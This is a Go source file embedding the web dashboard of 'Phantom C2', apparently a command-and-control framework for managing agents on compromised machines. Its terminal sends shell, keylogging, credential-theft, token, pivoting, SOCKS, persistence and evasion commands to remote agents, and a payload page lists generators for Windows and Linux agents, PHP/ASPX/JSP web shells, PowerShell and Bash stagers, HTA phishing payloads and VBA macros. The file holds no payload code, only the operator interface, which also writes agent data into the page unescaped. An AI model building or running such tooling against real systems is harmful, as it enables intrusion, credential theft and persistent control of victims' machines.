package webui

const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Phantom C2 — Dashboard</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0f172a; color: #e2e8f0; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; font-size: 14px; }

  /* Header */
  .header { background: #1e293b; padding: 16px 24px; border-bottom: 1px solid #334155; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
  .header-left { display: flex; align-items: center; gap: 16px; }
  .logo { color: #a78bfa; font-size: 22px; font-weight: bold; letter-spacing: -0.5px; }
  .logo span { color: #64748b; font-size: 12px; font-weight: normal; margin-left: 8px; }
  .status-dot { width: 8px; height: 8px; background: #4ade80; border-radius: 50%; display: inline-block; }
  .header-right { display: flex; gap: 8px; }
  .btn { background: #334155; border: 1px solid #475569; color: #e2e8f0; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 12px; transition: all 0.15s; }
  .btn:hover { background: #475569; border-color: #64748b; }
  .btn-primary { background: #7c3aed; border-color: #8b5cf6; }
  .btn-primary:hover { background: #6d28d9; }
  .btn-danger { background: #991b1b; border-color: #b91c1c; }

  /* Layout */
  .layout { display: flex; height: calc(100vh - 56px); }
  .sidebar { width: 220px; background: #1e293b; border-right: 1px solid #334155; padding: 12px 0; flex-shrink: 0; }
  .main { flex: 1; overflow-y: auto; padding: 20px; }

  /* Sidebar nav */
  .nav-item { display: flex; align-items: center; gap: 10px; padding: 10px 20px; color: #94a3b8; cursor: pointer; transition: all 0.15s; font-size: 13px; }
  .nav-item:hover { background: #334155; color: #e2e8f0; }
  .nav-item.active { background: #334155; color: #a78bfa; border-left: 3px solid #a78bfa; }
  .nav-icon { font-size: 16px; width: 20px; text-align: center; }
  .nav-divider { border-top: 1px solid #334155; margin: 8px 16px; }
  .nav-label { padding: 8px 20px; font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; color: #64748b; }

  /* Stats */
  .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 20px; }
  .stat { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 16px; }
  .stat-label { color: #64748b; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
  .stat-value { font-size: 28px; font-weight: bold; margin-top: 4px; }
  .green { color: #4ade80; } .purple { color: #a78bfa; } .blue { color: #60a5fa; } .yellow { color: #fbbf24; } .red { color: #f87171; }

  /* Panels */
  .panel { background: #1e293b; border: 1px solid #334155; border-radius: 10px; margin-bottom: 16px; overflow: hidden; }
  .panel-head { padding: 12px 16px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; }
  .panel-head h3 { font-size: 14px; color: #a78bfa; }
  .panel-body { padding: 0; }

  /* Tables */
  table { width: 100%; border-collapse: collapse; }
  th { padding: 10px 14px; text-align: left; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: #64748b; background: #0f172a; }
  td { padding: 10px 14px; border-top: 1px solid #1a2332; font-size: 13px; }
  tr:hover td { background: #172033; }
  tr.clickable { cursor: pointer; }

  /* Badges */
  .badge { display: inline-block; padding: 2px 10px; border-radius: 10px; font-size: 11px; font-weight: 600; }
  .b-active, .b-running, .b-complete { background: #065f46; color: #6ee7b7; }
  .b-dormant, .b-pending, .b-sent { background: #78350f; color: #fcd34d; }
  .b-dead, .b-stopped, .b-error { background: #7f1d1d; color: #fca5a5; }

  /* Terminal */
  .terminal { background: #0c0c0c; border: 1px solid #334155; border-radius: 10px; overflow: hidden; }
  .term-header { background: #1a1a1a; padding: 8px 14px; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #333; }
  .term-dot { width: 10px; height: 10px; border-radius: 50%; }
  .term-dot.r { background: #ff5f56; } .term-dot.y { background: #ffbd2e; } .term-dot.g { background: #27c93f; }
  .term-title { color: #888; font-size: 12px; margin-left: 8px; }
  .term-body { padding: 12px 16px; max-height: 400px; overflow-y: auto; font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace; font-size: 13px; line-height: 1.6; }
  .term-output { white-space: pre-wrap; word-break: break-all; }
  .term-line { color: #4ade80; }
  .term-error { color: #f87171; }
  .term-info { color: #60a5fa; }
  .term-input-row { display: flex; align-items: center; padding: 8px 16px; background: #111; border-top: 1px solid #333; }
  .term-prompt { color: #a78bfa; font-family: monospace; font-size: 13px; margin-right: 8px; white-space: nowrap; }
  .term-input { flex: 1; background: none; border: none; color: #e2e8f0; font-family: monospace; font-size: 13px; outline: none; }

  /* Agent detail */
  .agent-info { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 16px; }
  .info-item { }
  .info-label { color: #64748b; font-size: 11px; text-transform: uppercase; }
  .info-value { color: #e2e8f0; font-size: 14px; margin-top: 2px; }

  /* Hidden sections */
  .page { display: none; }
  .page.active { display: block; }

  @media (max-width: 900px) { .sidebar { display: none; } .stats { grid-template-columns: repeat(2, 1fr); } }
</style>
</head>
<body>

<div class="header">
  <div class="header-left">
    <span class="status-dot"></span>
    <div class="logo">Phantom C2 <span>Dashboard</span></div>
  </div>
  <div class="header-right">
    <button class="btn" onclick="refreshAll()">Refresh</button>
  </div>
</div>

<div class="layout">
  <div class="sidebar">
    <div class="nav-label">Main</div>
    <div class="nav-item active" onclick="showPage('dashboard')"><span class="nav-icon">📊</span> Dashboard</div>
    <div class="nav-item" onclick="showPage('agents')"><span class="nav-icon">🖥️</span> Agents</div>
    <div class="nav-item" onclick="showPage('listeners')"><span class="nav-icon">📡</span> Listeners</div>
    <div class="nav-item" onclick="showPage('tasks')"><span class="nav-icon">📋</span> Tasks</div>
    <div class="nav-divider"></div>
    <div class="nav-label">Interact</div>
    <div class="nav-item" onclick="showPage('interact')"><span class="nav-icon">💻</span> Terminal</div>
    <div class="nav-divider"></div>
    <div class="nav-label">Tools</div>
    <div class="nav-item" onclick="showPage('payloads')"><span class="nav-icon">🔧</span> Payloads</div>
    <div class="nav-item" onclick="showPage('events')"><span class="nav-icon">📜</span> Event Log</div>
  </div>

  <div class="main">
    <!-- Dashboard Page -->
    <div id="page-dashboard" class="page active">
      <div class="stats">
        <div class="stat"><div class="stat-label">Agents</div><div class="stat-value green" id="s-agents">0</div></div>
        <div class="stat"><div class="stat-label">Listeners</div><div class="stat-value purple" id="s-listeners">0</div></div>
        <div class="stat"><div class="stat-label">Tasks</div><div class="stat-value blue" id="s-tasks">0</div></div>
        <div class="stat"><div class="stat-label">Events</div><div class="stat-value yellow" id="s-events">0</div></div>
      </div>
      <div class="panel"><div class="panel-head"><h3>Active Agents</h3></div><div class="panel-body"><table>
        <thead><tr><th>Name</th><th>OS</th><th>Host</th><th>User</th><th>IP</th><th>Last Seen</th><th>Status</th></tr></thead>
        <tbody id="dash-agents"></tbody>
      </table></div></div>
      <div class="panel"><div class="panel-head"><h3>Recent Tasks</h3></div><div class="panel-body"><table>
        <thead><tr><th>Agent</th><th>Type</th><th>Command</th><th>Status</th><th>Time</th></tr></thead>
        <tbody id="dash-tasks"></tbody>
      </table></div></div>
    </div>

    <!-- Agents Page -->
    <div id="page-agents" class="page">
      <div class="panel"><div class="panel-head"><h3>All Agents</h3></div><div class="panel-body"><table>
        <thead><tr><th>Name</th><th>OS</th><th>Host</th><th>User</th><th>IP</th><th>Sleep</th><th>Last Seen</th><th>Status</th><th>Action</th></tr></thead>
        <tbody id="all-agents"></tbody>
      </table></div></div>
    </div>

    <!-- Listeners Page -->
    <div id="page-listeners" class="page">
      <div class="panel"><div class="panel-head"><h3>Listeners</h3></div><div class="panel-body"><table>
        <thead><tr><th>Name</th><th>Type</th><th>Bind</th><th>Status</th></tr></thead>
        <tbody id="all-listeners"></tbody>
      </table></div></div>
    </div>

    <!-- Tasks Page -->
    <div id="page-tasks" class="page">
      <div class="panel"><div class="panel-head"><h3>Task History</h3></div><div class="panel-body"><table>
        <thead><tr><th>ID</th><th>Agent</th><th>Type</th><th>Command</th><th>Status</th><th>Time</th><th>Output</th></tr></thead>
        <tbody id="all-tasks"></tbody>
      </table></div></div>
    </div>

    <!-- Interactive Terminal Page -->
    <div id="page-interact" class="page">
      <div style="margin-bottom:12px; display:flex; gap:8px; align-items:center;">
        <span style="color:#64748b;">Target Agent:</span>
        <select id="agent-select" style="background:#1e293b; border:1px solid #475569; color:#e2e8f0; padding:6px 12px; border-radius:6px; font-size:13px;">
          <option value="">Select an agent...</option>
        </select>
        <span id="agent-status-badge" style="margin-left:8px;"></span>
      </div>

      <div style="margin-bottom:12px; display:flex; gap:6px; flex-wrap:wrap;">
        <button class="btn" onclick="quickCmd('sysinfo')">sysinfo</button>
        <button class="btn" onclick="quickCmd('ps')">ps</button>
        <button class="btn" onclick="quickCmd('screenshot')">screenshot</button>
        <button class="btn" onclick="quickCmd('evasion')">evasion</button>
        <button class="btn" onclick="sendShell('whoami')">whoami</button>
        <button class="btn" onclick="sendShell('id')">id</button>
        <button class="btn" onclick="sendShell('hostname')">hostname</button>
        <button class="btn" onclick="sendShell('ipconfig /all')">ipconfig</button>
        <button class="btn btn-danger" onclick="quickCmd('kill')">kill</button>
      </div>

      <div class="terminal">
        <div class="term-header">
          <div class="term-dot r"></div><div class="term-dot y"></div><div class="term-dot g"></div>
          <span class="term-title" id="term-title">Phantom C2 — Interactive Terminal</span>
        </div>
        <div class="term-body" id="term-body">
          <div class="term-info">Welcome to Phantom C2 Interactive Terminal</div>
          <div class="term-info">Select an agent above, then type commands below.</div>
          <div class="term-info">Commands: shell, sysinfo, ps, screenshot, download, persist, sleep, cd, kill</div>
          <div class="term-info">          token, keylog, socks, portfwd, creds, pivot, evasion, ad-*</div>
          <div>&nbsp;</div>
        </div>
        <div class="term-input-row">
          <span class="term-prompt" id="term-prompt">phantom &gt;</span>
          <input class="term-input" id="term-input" placeholder="Type a command..." onkeydown="if(event.key==='Enter')sendTermCmd()" autofocus>
        </div>
      </div>
    </div>

    <!-- Payloads Page -->
    <div id="page-payloads" class="page">
      <div class="panel"><div class="panel-head"><h3>Payload Generator</h3></div><div class="panel-body" style="padding:20px;">
        <p style="color:#94a3b8; margin-bottom:16px;">Generate payloads from the CLI using these commands:</p>
        <table>
          <thead><tr><th>Command</th><th>Description</th></tr></thead>
          <tbody>
            <tr><td><code>generate exe &lt;url&gt;</code></td><td>Windows EXE agent</td></tr>
            <tr><td><code>generate elf &lt;url&gt;</code></td><td>Linux ELF agent</td></tr>
            <tr><td><code>generate aspx &lt;url&gt;</code></td><td>ASPX web shell</td></tr>
            <tr><td><code>generate php &lt;url&gt;</code></td><td>PHP web shell</td></tr>
            <tr><td><code>generate jsp &lt;url&gt;</code></td><td>JSP web shell</td></tr>
            <tr><td><code>generate powershell &lt;url&gt;</code></td><td>PowerShell stager</td></tr>
            <tr><td><code>generate bash &lt;url&gt;</code></td><td>Bash stager</td></tr>
            <tr><td><code>generate hta &lt;url&gt;</code></td><td>HTA phishing payload</td></tr>
            <tr><td><code>generate vba &lt;url&gt;</code></td><td>VBA macro</td></tr>
          </tbody>
        </table>
      </div></div>
    </div>

    <!-- Events Page -->
    <div id="page-events" class="page">
      <div class="panel"><div class="panel-head"><h3>Event Log</h3></div><div class="panel-body">
        <div id="event-log" style="padding:16px; font-family:monospace; font-size:12px; max-height:600px; overflow-y:auto;"></div>
      </div></div>
    </div>
  </div>
</div>

<script>
// ──── State ────
let currentAgent = null;
let cmdHistory = [];
let historyIdx = -1;

// ──── Navigation ────
function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.getElementById('page-' + name).classList.add('active');
  event.target.closest('.nav-item').classList.add('active');
  if (name === 'interact') document.getElementById('term-input').focus();
}

// ──── Badge helper ────
function badge(s) {
  const c = {'active':'b-active','running':'b-running','complete':'b-complete','dormant':'b-dormant','pending':'b-pending','sent':'b-sent','dead':'b-dead','stopped':'b-stopped','error':'b-error'}[s] || 'b-pending';
  return '<span class="badge '+c+'">'+s+'</span>';
}

// ──── Data fetching ────
async function fetchJ(url) { try { const r = await fetch(url); return await r.json(); } catch(e) { return []; } }

async function refreshAll() {
  const agents = await fetchJ('/api/agents');
  const listeners = await fetchJ('/api/listeners');
  const tasks = await fetchJ('/api/tasks');
  const events = await fetchJ('/api/events');

  // Stats
  document.getElementById('s-agents').textContent = agents.length;
  document.getElementById('s-listeners').textContent = listeners.filter(l=>l.status==='running').length;
  document.getElementById('s-tasks').textContent = tasks.length;
  document.getElementById('s-events').textContent = (events||[]).length;

  // Dashboard agents
  document.getElementById('dash-agents').innerHTML = agents.map(a =>
    '<tr class="clickable" onclick="selectAgent(\''+a.name+'\')"><td><strong>'+a.name+'</strong></td><td>'+(a.os==='windows'?'🪟':'🐧')+' '+a.os+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td><td>'+a.ip+'</td><td>'+a.last_seen+'</td><td>'+badge(a.status)+'</td></tr>'
  ).join('') || '<tr><td colspan="7" style="color:#64748b;text-align:center;padding:20px;">No agents connected</td></tr>';

  // All agents
  document.getElementById('all-agents').innerHTML = agents.map(a =>
    '<tr><td><strong>'+a.name+'</strong></td><td>'+(a.os==='windows'?'🪟':'🐧')+' '+a.os+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td><td>'+a.ip+'</td><td>'+a.sleep+'</td><td>'+a.last_seen+'</td><td>'+badge(a.status)+'</td><td><button class="btn" onclick="selectAgent(\''+a.name+'\')">Interact</button></td></tr>'
  ).join('');

  // Listeners
  document.getElementById('all-listeners').innerHTML = listeners.map(l =>
    '<tr><td>'+l.name+'</td><td>'+l.type+'</td><td>'+l.bind+'</td><td>'+badge(l.status)+'</td></tr>'
  ).join('');

  // Dashboard tasks (last 10)
  document.getElementById('dash-tasks').innerHTML = tasks.slice(0,10).map(t =>
    '<tr><td>'+t.agent+'</td><td>'+t.type+'</td><td><code>'+(t.args||'-')+'</code></td><td>'+badge(t.status)+'</td><td>'+t.time+'</td></tr>'
  ).join('');

  // All tasks
  document.getElementById('all-tasks').innerHTML = tasks.map(t =>
    '<tr><td>'+t.id+'</td><td>'+t.agent+'</td><td>'+t.type+'</td><td><code>'+(t.args||'-')+'</code></td><td>'+badge(t.status)+'</td><td>'+t.time+'</td><td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace;font-size:11px;color:#94a3b8;">'+(t.output||'-')+'</td></tr>'
  ).join('');

  // Agent selector
  const sel = document.getElementById('agent-select');
  const current = sel.value;
  sel.innerHTML = '<option value="">Select an agent...</option>' + agents.map(a =>
    '<option value="'+a.name+'" '+(a.name===current?'selected':'')+'>'+a.name+' ('+a.os+' / '+a.hostname+')</option>'
  ).join('');

  // Events
  document.getElementById('event-log').innerHTML = (events||[]).map(e =>
    '<div style="color:#94a3b8;">'+e+'</div>'
  ).join('') || '<div style="color:#64748b;">No events yet</div>';

  // Update terminal title if agent selected
  if (sel.value) {
    document.getElementById('term-prompt').innerHTML = 'phantom [<span style="color:#22d3ee">'+sel.value+'</span>] &gt;';
    document.getElementById('term-title').textContent = 'Phantom C2 — ' + sel.value;
  }
}

// ──── Agent selection ────
function selectAgent(name) {
  document.getElementById('agent-select').value = name;
  currentAgent = name;
  document.getElementById('term-prompt').innerHTML = 'phantom [<span style="color:#22d3ee">'+name+'</span>] &gt;';
  document.getElementById('term-title').textContent = 'Phantom C2 — ' + name;
  showPage('interact');
  termLog('info', 'Interacting with ' + name);
  document.getElementById('term-input').focus();
}

document.getElementById('agent-select').addEventListener('change', function() {
  if (this.value) selectAgent(this.value);
});

// ──── Terminal ────
function termLog(type, text) {
  const body = document.getElementById('term-body');
  const div = document.createElement('div');
  div.className = 'term-' + (type || 'output');
  div.textContent = text;
  body.appendChild(div);
  body.scrollTop = body.scrollHeight;
}

async function sendTermCmd() {
  const input = document.getElementById('term-input');
  const raw = input.value.trim();
  input.value = '';
  if (!raw) return;

  const agent = document.getElementById('agent-select').value;
  if (!agent) { termLog('error', 'No agent selected — pick one from the dropdown above'); return; }

  cmdHistory.push(raw);
  historyIdx = cmdHistory.length;

  termLog('line', 'phantom [' + agent + '] > ' + raw);

  // Parse command
  const parts = raw.split(/\s+/);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1).join(' ');

  // Special: shell command sends the full string
  let command = cmd;
  let cmdArgs = args;
  if (cmd === 'shell' || cmd === 'exec' || cmd === 'cmd') {
    command = 'shell';
    cmdArgs = args;
  } else if (!['sysinfo','ps','screenshot','download','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot'].includes(cmd) && !cmd.startsWith('ad-')) {
    // Treat unknown commands as shell
    command = 'shell';
    cmdArgs = raw;
  }

  try {
    const resp = await fetch('/api/cmd', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ agent: agent, command: command, args: cmdArgs })
    });
    const data = await resp.json();
    if (data.error) {
      termLog('error', '[-] ' + data.error);
    } else {
      termLog('info', '[+] Task queued: ' + data.type + ' (ID: ' + data.task_id.substring(0,8) + ')');
      // Poll for result
      pollResult(data.task_id, agent);
    }
  } catch(e) {
    termLog('error', '[-] Request failed: ' + e.message);
  }
}

async function pollResult(taskId, agentName) {
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 2000));
    try {
      const detail = await fetchJ('/api/agent/' + agentName);
      if (detail.tasks) {
        const task = detail.tasks.find(t => taskId.startsWith(t.id) || t.id === taskId.substring(0,8));
        if (task && (task.output || task.error) && task.status !== 'pending' && task.status !== 'sent') {
          if (task.error) {
            termLog('error', task.error);
          } else if (task.output) {
            termLog('output', task.output);
          }
          return;
        }
      }
    } catch(e) {}
  }
  termLog('info', '[*] Timeout waiting for result — check Tasks page');
}

function quickCmd(cmd) {
  const agent = document.getElementById('agent-select').value;
  if (!agent) {
    showPage('interact');
    termLog('error', 'No agent selected');
    return;
  }
  showPage('interact');
  document.getElementById('term-input').value = cmd;
  sendTermCmd();
}

function sendShell(cmd) {
  const agent = document.getElementById('agent-select').value;
  if (!agent) { showPage('interact'); termLog('error', 'No agent selected'); return; }
  showPage('interact');
  document.getElementById('term-input').value = 'shell ' + cmd;
  sendTermCmd();
}

// Arrow key history
document.getElementById('term-input').addEventListener('keydown', function(e) {
  if (e.key === 'ArrowUp' && cmdHistory.length > 0) {
    historyIdx = Math.max(0, historyIdx - 1);
    this.value = cmdHistory[historyIdx] || '';
    e.preventDefault();
  } else if (e.key === 'ArrowDown') {
    historyIdx = Math.min(cmdHistory.length, historyIdx + 1);
    this.value = cmdHistory[historyIdx] || '';
    e.preventDefault();
  }
});

// ──── Init ────
refreshAll();
setInterval(refreshAll, 5000);
</script>
</body>
</html>`
